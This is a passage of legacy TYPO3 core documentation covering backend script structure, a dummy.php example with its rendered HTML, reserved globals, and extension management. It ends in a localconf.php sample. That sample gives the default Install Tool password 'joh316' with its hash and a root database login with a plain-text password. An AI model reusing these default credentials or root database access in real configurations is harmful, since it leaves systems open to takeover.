	<THEAD>
		<TR VALIGN=TOP>
			<TH WIDTH=20%>
				<P CLASS="western">Class</P>
			</TH>
			<TH WIDTH=17%>
				<P CLASS="western">Included in</P>
			</TH>
			<TH WIDTH=51%>
				<P CLASS="western">Description</P>
			</TH>
			<TH WIDTH=12%>
				<P CLASS="western">Avail. in FE</P>
			</TH>
		</TR>
	</THEAD>
	<TBODY>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western" STYLE="font-style: normal">template</P>
			</TD>
			<TD WIDTH=17%>
				<P CLASS="western">[optionally  included after init.php, see next
				section]</P>
			</TD>
			<TD WIDTH=51%>
				<P CLASS="western">Global backend template class for HTML-output
				in backend modules, instantiated inside template.php as
				$TBE_TEMPLATE</P>
			</TD>
			<TD WIDTH=12%>
				<P CLASS="western" ALIGN=CENTER>-</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western" STYLE="font-style: normal">language</P>
			</TD>
			<TD WIDTH=17%>
				<P CLASS="western">template.php</P>
			</TD>
			<TD WIDTH=51%>
				<P CLASS="western">Localization class which returns the correct
				localized labels for various parts in the backend. Instantiated
				as $LANG</P>
			</TD>
			<TD WIDTH=12%>
				<P CLASS="western" ALIGN=CENTER>-</P>
			</TD>
		</TR>
	</TBODY>
</TABLE>
<H5 CLASS="western">Example: A dummy backend script</H5>
<P CLASS="western">As an good example of how backend scripts
(modules) should be constructed, please look at the dummy.php file:</P>
<PRE CLASS="western"><CODE CLASS="western"><FONT COLOR="#ff8000">/** <BR> * Dummy document - displays nothing but background color.<BR> * <BR> * @author&nbsp;&nbsp;&nbsp;&nbsp;Kasper Skårhøj &lt;kasper@typo3.com&gt;<BR> * Revised for TYPO3 3.6 2/2003 by Kasper Skårhøj<BR> * XHTML compliant content<BR> */<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">require (</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'init.php'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">);<BR>require (</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'template.php'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">);<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// ***************************<BR>// Script Classes<BR>// ***************************<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">class </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">SC_dummy </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">{<BR>&nbsp;&nbsp;&nbsp;&nbsp;var </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$content</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR>&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">/**<BR>&nbsp;&nbsp;&nbsp;&nbsp; * Create content<BR>&nbsp;&nbsp;&nbsp;&nbsp; */<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">function </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">main</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">()&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;global </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TBE_TEMPLATE</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Start page<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TBE_TEMPLATE</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">-&gt;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">docType </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">= </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'xhtml_trans'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$this</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">-&gt;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">content</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">.=</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TBE_TEMPLATE</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">-&gt;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">startPage</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">(</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Dummy document'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// End page:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$this</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">-&gt;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">content</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">.=</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TBE_TEMPLATE</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">-&gt;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">endPage</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">();<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">/**<BR>&nbsp;&nbsp;&nbsp;&nbsp; * Print output<BR>&nbsp;&nbsp;&nbsp;&nbsp; */<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">function </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">printContent</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">()&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$this</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">-&gt;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">content</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>}<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Include extension?<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">if (</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">defined</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">(</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'TYPO3_MODE'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">) &amp;&amp; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">[</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">TYPO3_MODE</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">][</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'XCLASS'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">][</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'typo3/dummy.php'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">])&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;include_once(</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">[</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">TYPO3_MODE</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">][</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'XCLASS'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">][</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'typo3/dummy.php'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">]);<BR>}<BR><BR><BR><BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Make instance:<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$SOBE </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">= </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">t3lib_div</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">::</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">makeInstance</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">(</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'SC_dummy'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">);<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$SOBE</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">-&gt;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">main</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">();<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$SOBE</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">-&gt;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">printContent</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">();<BR></FONT></CODE></PRE><P CLASS="western">
(In addition a script must include opening and closing tags for php
(&lt;?php ... ?&gt;) and a copyright header defining the author and
GNU/GPL license. See almost any script in the backend for an example)</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">In this example you see the following important
elements:</P>
<UL>
	<LI><P CLASS="western">init.php is included by require(): We can now
	know that a backend user is authenticated, that there is a database
	connection etc.</P>
	<LI><P CLASS="western">template.php is included by require(): We can
	now create backend HTML-output and localized labels.</P>
	<LI><P CLASS="western">Script class is defined (here: &quot;SC_dummy&quot;,
	typically named &quot;SC_&quot; + script name). All processing
	should take place inside this class</P>
	<LI><P CLASS="western">Possible inclusion of an extension class for
	the &quot;SC_dummy&quot; (this is what happens in the lines after
	&quot;// Include extension?&quot;</P>
	<LI><P CLASS="western">Finally the script class is instantiated and
	the relevant functions are called - here main() and printContent().
	Which functions needs to be called from the global space depends on
	what <I>you</I> have put into your class!</P>
</UL>
<P CLASS="western">Inside the script class these basic steps for HTML
output is taken:</P>
<UL>
	<LI><P CLASS="western">The method $TBE_TEMPLATE-&gt;startPage('Dummy
	document') is called: This returns the header section of the output
	HTML page with the page title set to &quot;Dummy document&quot;.
	Prior to this function call the docType is set to XHTML Transitional
	(optional). You can also specify other optional values like
	additional CSS styles, JavaScript etc.</P>
	<LI><P CLASS="western">The method $TBE_TEMPLATE-&gt;endPage() is
	called: This returns the page footer.</P>
	<LI><P CLASS="western">In between the two function calls you can
	basically output any HTML you like as the page content. &lt;body&gt;
	tags have been set and typically the whole page is wrapped in a DIV
	tag as well.</P>
</UL>
<P CLASS="western">The HTML output of dummy.php will look like this:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western"><FONT COLOR="#800000">&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</FONT>
<FONT COLOR="#800000">&lt;?xml-stylesheet href=&quot;#internalStyle&quot; type=&quot;text/css&quot;?&gt;</FONT>
<FONT COLOR="#800000">&lt;!DOCTYPE html </FONT>
<FONT COLOR="#800000">     PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</FONT>
<FONT COLOR="#800000">     &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</FONT>
<FONT COLOR="#800000">&lt;html&gt;</FONT>
<FONT COLOR="#800000">&lt;head&gt;</FONT>
<FONT COLOR="#800000">	&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;/&gt;</FONT>
<FONT COLOR="#800000">	&lt;meta name=&quot;GENERATOR&quot; content=&quot;TYPO3 3.6.0-dev, http://typo3.com, &amp;#169; Kasper Sk&amp;#197;rh&amp;#248;j 1998-2003, extensions are copyright of their respective owners.&quot; /&gt;</FONT>
<FONT COLOR="#800000">	&lt;title&gt;Dummy document&lt;/title&gt;</FONT>
<FONT COLOR="#800000">	</FONT>
<FONT COLOR="#800000">		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheet.css&quot;/&gt;</FONT>
<FONT COLOR="#800000">		</FONT>
<FONT COLOR="#800000">		&lt;style type=&quot;text/css&quot; id=&quot;internalStyle&quot;&gt;</FONT>
<FONT COLOR="#800000">			/*&lt;![CDATA[*/</FONT>
<FONT COLOR="#800000">				A:hover {color: #254D7B}</FONT>
<FONT COLOR="#800000">				H2 {background-color: #9BA1A8;}</FONT>
<FONT COLOR="#800000">				H3 {background-color: #E7DBA8;}</FONT>
<FONT COLOR="#800000">				BODY {background-color: #F7F3EF;}</FONT>
<FONT COLOR="#800000">				</FONT>
<FONT COLOR="#800000">			/*]]&gt;*/</FONT>
<FONT COLOR="#800000">		&lt;/style&gt;</FONT>

<FONT COLOR="#800000">	</FONT>
<FONT COLOR="#800000">&lt;/head&gt;</FONT>
<FONT COLOR="#800000">&lt;body&gt;</FONT>

<FONT COLOR="#800000">&lt;!-- Wrapping DIV-section for whole page BEGIN --&gt;</FONT>
<FONT COLOR="#800000">&lt;div class=&quot;typo3-def&quot;&gt;</FONT>


<FONT COLOR="#008000"><B>... [additional content between startPage() and endPage() will be inserted here!] ...</B></FONT>


<FONT COLOR="#008080">	&lt;script type=&quot;text/javascript&quot;&gt;</FONT>
<FONT COLOR="#008080">		  /*&lt;![CDATA[*/</FONT>
<FONT COLOR="#008080">		if (top.busy &amp;&amp; top.busy.loginRefreshed) {</FONT>
<FONT COLOR="#008080">			top.busy.loginRefreshed();</FONT>
<FONT COLOR="#008080">		}</FONT>
<FONT COLOR="#008080">		 /*]]&gt;*/</FONT>
<FONT COLOR="#008080">	&lt;/script&gt;</FONT>

<FONT COLOR="#008080">&lt;!-- Wrapping DIV-section for whole page END --&gt;</FONT>
<FONT COLOR="#008080">&lt;/div&gt;</FONT>
<FONT COLOR="#008080">&lt;/body&gt;</FONT>
<FONT COLOR="#008080">&lt;/html&gt;	</FONT></PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">The maroon coloured content is created by
startPage()</P>
<P CLASS="western">The teal coloured content is created by endPage()</P>
<P CLASS="western">The green/bold line represents the position where
your custom output will be placed in the document.</P>
<H4 CLASS="western">API documentation</H4>
<P CLASS="western">There is a host of methods inside the template
class which can be used. Some of these are documented in &quot;TYPO3
Core API&quot; and others by examples in various Extension
Programming Tutorials.</P>
<H3 CLASS="western"><A NAME="2.1.4.Other reserved global variables|outline"></A>
Other reserved global variables</H3>
<P CLASS="western">In addition to the global variables declared in
&quot;init.php&quot; there are a number of other reserved global
variables which has a recognized importance. These are always defined
outside &quot;init.php&quot; either prior to or after the inclusion
of &quot;init.php&quot;.</P>
<TABLE WIDTH=100% BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
	<COL WIDTH=52*>
	<COL WIDTH=45*>
	<COL WIDTH=130*>
	<COL WIDTH=30*>
	<THEAD>
		<TR VALIGN=TOP>
			<TH WIDTH=20%>
				<P CLASS="western">Global variable</P>
			</TH>
			<TH WIDTH=17%>
				<P CLASS="western">Defined in</P>
			</TH>
			<TH WIDTH=51%>
				<P CLASS="western">Description</P>
			</TH>
			<TH WIDTH=12%>
				<P CLASS="western">Avail. in FE</P>
			</TH>
		</TR>
	</THEAD>
	<TBODY>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western"><I>$MLANG</I></P>
			</TD>
			<TD WIDTH=17%>
				<P CLASS="western">[prior to init.php / conf.php of modules]</P>
			</TD>
			<TD WIDTH=51%>
				<P CLASS="western">Contains a limited amount of language labels:
				The title, icon and description of the module.</P>
			</TD>
			<TD WIDTH=12%>
				<P CLASS="western" ALIGN=CENTER>-</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western"><I>$MCONF</I></P>
			</TD>
			<TD WIDTH=17%>
				<P CLASS="western">[prior to init.php / conf.php of modules]</P>
			</TD>
			<TD WIDTH=51%>
				<P CLASS="western">Contains a few module-cofiguration
				informations like the name, access and which script to use.
				Primarily used by access control and the class t3lib_loadmodules.</P>
			</TD>
			<TD WIDTH=12%>
				<P CLASS="western" ALIGN=CENTER>-</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western"><I>$BACK_PATH</I></P>
			</TD>
			<TD WIDTH=17%>
				<P CLASS="western">[prior to init.php / conf.php of modules]</P>
			</TD>
			<TD WIDTH=51%>
				<P CLASS="western">Possibly set in the parent script including
				&quot;init.php&quot; pointing back to the &quot;TYPO3_mainDir&quot;
				from wherever the parent script is located. Used primarily for
				images and links. See discussion on &quot;TYPO3_MOD_PATH&quot;
				and modules in general. 
				</P>
			</TD>
			<TD WIDTH=12%>
				<P CLASS="western" ALIGN=CENTER>-</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western"><I>$LOCKED_RECORDS</I></P>
			</TD>
			<TD WIDTH=17%>
				<P CLASS="western">t3lib_BEfunc</P>
			</TD>
			<TD WIDTH=51%>
				<P CLASS="western">Locking of records is cached in this variable.</P>
			</TD>
			<TD WIDTH=12%>
				<P CLASS="western" ALIGN=CENTER><BR>
				</P>
			</TD>
		</TR>
	</TBODY>
</TABLE>
<H2 CLASS="western"><A NAME="2.2.Extensions|outline"></A>Extensions</H2>
<H3 CLASS="western"><A NAME="2.2.1.What are extensions|outline"></A>What
are extensions</H3>
<P CLASS="western">First of all this is only a short description of
extensions; For a more detailed description of extension, please see
the <A HREF="#TYPO3%20Extension%20API%7Coutline">Extension API
section in &quot;TYPO3 Core API&quot;</A>. 
</P>
<P CLASS="western">An &quot;extension&quot; in relation to TYPO3 is a
set of files/scripts which can integrate themselves with TYPO3s core
through an API an thus seemlessly extend the capabilities of TYPO3. 
</P>
<P CLASS="western">These are the basic properties of extensions:</P>
<UL>
	<LI><P CLASS="western">All files contained within a single directory</P>
	<LI><P CLASS="western">Easily installed/removed/exchanged</P>
	<LI><P CLASS="western">Has a unique key (extension key) used for
	naming of all elements (variables, database tables, fields, classes
	etc.).</P>
	<LI><P CLASS="western">Can interact with any part of the system. If
	not through the available APIs, ultimately (almost) any class in
	TYPO3 can be extended with full backwards compatibility maintained.</P>
</UL>
<H4 CLASS="western">Where are extensions located?</H4>
<P CLASS="western"><IMG SRC="10_html_m74e1ef68.png" NAME="Graphic3" ALIGN=LEFT WIDTH=182 HEIGHT=472 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Extensions can be installed in three locations:</P>
<OL>
	<LI><P CLASS="western">typo3/ext/: Global extensions. A part of the
	source code directory. Available to all TYPO3 installations sharing
	the same sourcecode. Is not <I>necessarily</I> available! You can
	remove or add extensions here and some source distributions will not
	contain the ext/ directory with global extensions (in which case you
	will have to add them yourself from TER).</P>
	<LI><P CLASS="western">typo3/sysext/: System extensions. Just like
	global extensions: A part of the source code directory. But the
	system extensions are <I>always </I>distributed with the source code
	so you can depend on them being there. Further you generally don't
	need to upgrade system extensions manually as they are upgraded with
	new source code releases. System extensions carry a special status
	of being officially endorsed by the TYPO3 system and they are
	required to match the quality of the core code regarding the
	standards set out in the TYPO3 Coding Guidelines.</P>
	<LI><P CLASS="western">typo3conf/ext/: Local extensions: Only
	available to the local TYPO3 installation. This is the typical
	location for most extensions which are installed on a per-project
	basis since the extension is used in only this one case. Also the
	position for user defined extensions.</P>
</OL>
<H4 CLASS="western">What can they change?</H4>
<P CLASS="western">Extensions can change practically anything in
TYPO3. The concept is very capable since it was created to add
limitless power to TYPO3 without having to directly change the core.
As such extensions will make it possible for TYPO3 to be a true
framework for just any application you can imagine. Installing one
set of extensions will make TYPO3 one application - installing
another set of extension will make TYPO3 another application. And the
core is thus a basic set of modules, an Extension Manager and an API
provided for the extensions so they can use core features right away.</P>
<P CLASS="western">Although the basic rule is &quot;anything is
possible&quot; this is at least a partial list of features provided
by extensions:</P>
<UL>
	<LI><P CLASS="western">Addition of database tables and fields to
	existing tables.</P>
	<LI><P CLASS="western">Addition of tables with static information</P>
	<LI><P CLASS="western">Addition of TypoScript static template files
	or adhoc snippets</P>
	<LI><P CLASS="western">Addition of backend skins</P>
	<LI><P CLASS="western">Addition of frontend plugins of any kind</P>
	<LI><P CLASS="western">Addition of backend modules of any kind</P>
	<LI><P CLASS="western">Addition of click-menu items (context
	sensitive menus)</P>
	<LI><P CLASS="western">Addition of Page and User TSconfig</P>
	<LI><P CLASS="western">Addition of configuration values</P>
	<LI><P CLASS="western">Extension of any class in the system</P>
</UL>
<P CLASS="western">... and of course all kinds of combinations.</P>
<H3 CLASS="western"><A NAME="2.2.2.Managing extensions|outline"></A>Managing
extensions</H3>
<H4 CLASS="western">Installing extensions</H4>
<P CLASS="western">Extensions available to a TYPO3 installation can
be installed by the Extension Manager which is a core module:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m6e41997b.png" NAME="Graphic30" ALIGN=LEFT WIDTH=669 HEIGHT=290 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Here three extensions are installed and as you can
see they are apparently adding backend modules to the menu. Basically
installing/de-installing an extension is a matter of clicking the +/-
button next to the extension. In some cases additional accept of for
example database tables/field additions are necessary but the process
itself is as simple as that!</P>
<H4 CLASS="western">Importing extensions</H4>
<P CLASS="western">If an extension is not available on the server you
can import it from the TYPO3 Extension Repository (TER) or manually
upload it from a file (if you have a T3X file available):</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m592ab551.png" NAME="Graphic31" ALIGN=LEFT WIDTH=669 HEIGHT=365 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Connecting to the online repository will show a
list like this:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_ec225a5.png" NAME="Graphic32" ALIGN=LEFT WIDTH=669 HEIGHT=225 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">You can easily see which extensions are not
locally available on your server and with a single click on the
import icon the extension is downloaded from the repository and
installed on your server! 
</P>
<P CLASS="western">Bottom-line is: In less than 30 seconds you can
import and install an extensions with all database tables and fields
automatically created for you, ready for use!</P>
<H4 CLASS="western">More about extensions?</H4>
<P CLASS="western">This was just a short introduction so you could
grasp the potential of extensions. Since this document is about the
TYPO3 core you can read more about the <A HREF="#TYPO3%20Extension%20API%7Coutline">Extension
API in the document &quot;TYPO3 Core API&quot;</A>. You can also find
tutorials about <A HREF="http://typo3.org/">extension programming on
TYPO3.org</A>. If you wish to investigate publicly available
extensions go to <A HREF="http://typo3.org/1420.0.html">typo3.org</A>
where the TYPO3 Extensions Repository has a frontend for just that:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_6b8b7533.png" NAME="Graphic33" ALIGN=LEFT WIDTH=607 HEIGHT=404 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<H2 CLASS="western"><A NAME="2.3.Configuration|outline"></A>Configuration</H2>
<H3 CLASS="western"><A NAME="2.3.1.localconf.php and $TYPO3_CONF_VARS|outline"></A>
localconf.php and $TYPO3_CONF_VARS</H3>
<P CLASS="western">Configuration of TYPO3 is basically about setting
values in the global $TYPO3_CONF_VARS array. This is supposed to take
place in the file localconf.php located in the typo3conf/ directory
(PATH_typo3conf). Furthermore, extensions can add content included in
the same context as the localconf.php by defining &quot;ext_localconf.php&quot;
files. See the <A HREF="#ext_tables.php%20and%20ext_localconf.php%7Coutline">Extension
API for details</A>.</P>
<P CLASS="western">Typically a localconf.php file could look like
this:</P>
<PRE CLASS="western"><CODE CLASS="western"><FONT COLOR="#0000bb">&lt;?php<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Setting the Install Tool password to the default 'joh316'<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">[</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'BE'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">][</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'installToolPassword'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">] = </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'bacb98acf97e0b6112b1d1b650b84971'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Setting the list of extensions to BLANK (by default there is a long list set)<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">[</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'EXT'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">][</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'extList'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">] = </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'install'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">[</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'EXT'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">][</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'requiredExt'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">] = </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'lang'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Setting up the database username, password and host<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$typo_db_username </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">= </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'root'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$typo_db_password </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">= </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'nuwr875'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$typo_db_host </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">= </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'localhost'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">## INSTALL SCRIPT EDIT POINT TOKEN - all lines after this points may be changed by the install script!<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$typo_db </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">= </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'t3_coreinstall'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">//&nbsp;&nbsp;Modified or inserted by Typo3 Install Tool.<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">[</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'SYS'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">][</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'sitename'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">] = </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Core Install'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE 